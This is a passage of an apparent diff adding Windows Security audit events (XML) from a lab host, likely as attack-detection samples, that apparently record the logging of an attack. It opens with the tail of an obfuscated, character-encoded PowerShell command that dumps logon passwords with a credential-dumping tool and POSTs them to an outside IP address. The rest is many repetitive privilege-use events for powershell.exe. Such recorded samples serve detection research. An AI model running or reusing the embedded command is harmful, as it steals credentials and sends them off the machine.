105,108 , 101, 103,101,58 ,58,100 ,101 , 98,117,103 ,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111 ,103, 111,110, 112 ,97,115 , 115 , 119,111, 114,100 , 115 , 32 , 101, 120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101, 110,116 ,84,121, 112,101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 , 110, 47, 120,45 , 119, 119 , 119 ,45 ,102,111, 114 ,109 ,45,117, 114, 108 , 101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46, 84 ,101, 120 ,116 , 46, 69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 , 116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113, 117 , 101, 115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76, 101, 110,103,116 , 104 , 32, 61 ,32, 36 ,98 ,121,116, 101 ,115 ,46, 76, 101,110,103 ,116, 104,10, 36, 114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 , 101 , 115 , 116,46 , 71, 101, 116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101, 97,109 , 40,41, 10, 36,114 , 101 , 113, 117, 101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46, 87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 , 115 ,44,32 ,48 ,44, 32, 36 ,98, 121,116,101 ,115 , 46, 76 , 101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 , 109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117, 101,115 , 116 , 46, 71 , 101 ,116,82 ,101 , 115, 112 ,111 , 110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +"$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) " ) "</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.667108700Z" />
+      <EventRecordID>937784</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Token</Data>
+      <Data Name="ObjectName">
+      </Data>
+      <Data Name="HandleId">0x16c</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%4592
+				%%4593
+				%%4594
+				%%4595
+				%%4596
+				%%4597
+				%%4598
+				%%4599
+				%%4600
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.698359100Z" />
+      <EventRecordID>937785</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="ObjectName">C:\Users\admmig\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\590aee7bdd69b59b.customDestinations-ms</Data>
+      <Data Name="HandleId">0x214</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1541
+				%%1542
+				%%4416
+				%%4417
+				%%4419
+				%%4423
+				</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.698359100Z" />
+      <EventRecordID>937786</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x214</Data>
+      <Data Name="AccessMask">18022539</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.698359100Z" />
+      <EventRecordID>937787</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="ObjectName">C:\Users\admmig\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\830X4IIYY3PQS8VSL0MU.temp</Data>
+      <Data Name="HandleId">0x258</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%1542
+				%%4416
+				%%4417
+				%%4418
+				%%4419
+				%%4420
+				%%4423
+				%%4424
+				</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege
+			SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.698359100Z" />
+      <EventRecordID>937788</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x258</Data>
+      <Data Name="AccessMask">18809247</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege
+			SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937789</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x454</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937790</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x454</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937791</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x458</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937792</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x458</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937793</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x460</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937794</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x460</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937795</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x468</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937796</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x468</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937797</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x470</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937798</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x470</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937799</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x478</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937800</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x478</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937801</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x480</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
